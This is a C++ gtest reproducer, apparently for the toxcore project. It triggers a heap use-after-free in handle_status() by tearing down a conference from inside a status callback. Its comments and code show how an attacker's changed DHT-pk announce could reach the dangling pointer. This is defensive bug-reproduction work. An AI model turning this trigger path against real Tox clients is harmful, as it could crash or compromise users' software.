/* SPDX-License-Identifier: GPL-3.0-or-later
 *
 * Reproducer for a use-after-free in friend_connection.c : handle_status().
 *
 * handle_status() takes `friend_con = get_conn(fr_c, id)` (a pointer INTO the
 * reallocatable fr_c->conns array) and then invokes the connection's status
 * callbacks, dereferencing `friend_con` across and after them WITHOUT
 * re-fetching -- unlike its siblings handle_packet()/handle_lossy_packet() in
 * the same file, which re-fetch after every callback.
 *
 * A status callback can realloc fr_c->conns out from under it. The chain is
 * non-local (friend_connection <-> group/conference):
 *
 *   handle_status(offline)                         [friend_connection.c] holds friend_con
 *     -> g_handle_status (conference callback)       [group.c]
 *       -> set_conns_status_groups -> check_disconnected
 *         -> freeze_peer -> delpeer -> remove_connection
 *           -> kill_friend_connection                [friend_connection.c]
 *             -> wipe_friend_conn -> realloc_friendconns   (fr_c->conns MOVED/FREED)
 *   back in handle_status: friend_con->callbacks[i]  -> use-after-free
 *
 * check_disconnected only tears peers down once the conference has NO online
 * connection, and the realloc (wipe) only happens when a connection's lock_count
 * hits 0 -- i.e. a conference-only connection (a peer we reached by introduction,
 * not a direct friend). So we need a >=3 peer conference where the victim holds
 * a conference-only connection, then drive the whole conference offline.
 *
 * Built with ASan this aborts with heap-use-after-free in handle_status /
 * around the fr_c->conns access.
 */
#include <gtest/gtest.h>

#include <cstdint>
#include <cstdio>
#include <cstring>

#include "../testing/support/public/simulation.hh"
#include "../testing/support/public/tox_network.hh"
#include "tox.h"
#include "tox_struct.h"
#include "Messenger.h"
#include "DHT.h"
#include "crypto_core.h"
#include "onion_client.h"
#include "events/events_alloc.h"

namespace {

using tox::test::connect_friends;
using tox::test::Simulation;

struct ConfCtx {
    uint32_t conf = UINT32_MAX;
};

void on_conf_invite(Tox *tox, Tox_Friend_Number friend_number, Tox_Conference_Type type,
    const uint8_t cookie[], size_t length, void *user_data)
{
    (void)type;
    ConfCtx *c = static_cast<ConfCtx *>(user_data);
    if (c->conf == UINT32_MAX) {
        c->conf = tox_conference_join(tox, friend_number, cookie, length, nullptr);
    }
}

TEST(FriendConnStatus, UseAfterFreeOnConferenceTeardown)
{
    Simulation sim{9001};
    sim.net().set_latency(5);

    auto vnode = sim.create_node();
    auto victim = vnode->create_tox();
    auto anode = sim.create_node();
    auto attacker = anode->create_tox();
    ASSERT_NE(victim, nullptr);
    ASSERT_NE(attacker, nullptr);

    ASSERT_TRUE(connect_friends(sim, *vnode, victim.get(), *anode, attacker.get()));

    ConfCtx actx;
    tox_callback_conference_invite(attacker.get(), on_conf_invite);

    const uint32_t vconf = tox_conference_new(victim.get(), nullptr);
    ASSERT_NE(vconf, UINT32_MAX);
    ASSERT_TRUE(tox_conference_invite(victim.get(), 0, vconf, nullptr));

    // Wait until both sides see 2 peers (connected conference).
    sim.run_until(
        [&]() {
            tox_iterate(victim.get(), nullptr);
            tox_iterate(attacker.get(), &actx);
            return actx.conf != UINT32_MAX
                && tox_conference_peer_count(victim.get(), vconf, nullptr) == 2
                && tox_conference_peer_count(attacker.get(), actx.conf, nullptr) == 2;
        },
        120000);
    ASSERT_EQ(tox_conference_peer_count(victim.get(), vconf, nullptr), 2u);
    fprintf(stderr, "conference established; victim sees 2 peers\n");

    // Drop the friendship but keep the conference. This releases the Messenger
    // lock on the victim's connection to A, leaving the conference as the sole
    // owner (lock_count == 1). Now when that connection is torn down, the final
    // kill_friend_connection reaches wipe_friend_conn -> realloc_friendconns.
    Tox_Err_Friend_Delete derr;
    ASSERT_TRUE(tox_friend_delete(victim.get(), 0, &derr));
    ASSERT_EQ(derr, TOX_ERR_FRIEND_DELETE_OK);

    // The victim's conference connection to A is now live (crypt_connection_id != -1)
    // and conference-only (lock_count 0). Deliver a DHT-pk announce for A carrying a
    // DIFFERENT dht pk -- exactly what an attacker does with an ONION_DATA_DHTPK packet
    // (received via handle_dhtpk_announce -> the friend's dht_pk_callback). The test
    // hook fires that same callback deterministically.
    //
    // dht_pk_callback sees crypt_connection_id != -1, so it calls handle_status(.., false),
    // whose conference g_handle_status callback runs check_disconnected -> freeze_peer ->
    // delpeer -> kill_friend_connection -> wipe_friend_conn -> realloc_friendconns, freeing
    // fr_c->conns. dht_pk_callback then dereferences the dangling `friend_con` at
    // onion_set_friend_dht_pubkey(.., friend_con->onion_friendnum, ..) -> use-after-free.
    uint8_t fake_dht_pk[CRYPTO_PUBLIC_KEY_SIZE];
    memset(fake_dht_pk, 0xAB, sizeof(fake_dht_pk));

    // The internal callbacks expect a Tox_Userdata{ Tox*, Tox_Events_State* } as
    // user_data (what tox_iterate passes). Provide a layout-compatible one with a
    // valid events state so the conference peer_list_changed recorder doesn't fault
    // on a null userdata -- letting the teardown complete and the real UAF surface.
    struct UserdataCompat {
        Tox *tox;
        Tox_Events_State *state;
    };
    Tox_Events_State ev_state = {TOX_ERR_EVENTS_ITERATE_OK, victim->m->mem, nullptr};
    UserdataCompat ud = {victim.get(), &ev_state};

    fprintf(stderr, "firing DHT-pk announce (changed pk) for A...\n");
    onion_friend_fire_dht_pk_for_test(victim->m->onion_c, fake_dht_pk, &ud);

    fprintf(stderr, "done (no ASan abort); victim peer_count=%u\n",
        tox_conference_peer_count(victim.get(), vconf, nullptr));
}

}  // namespace
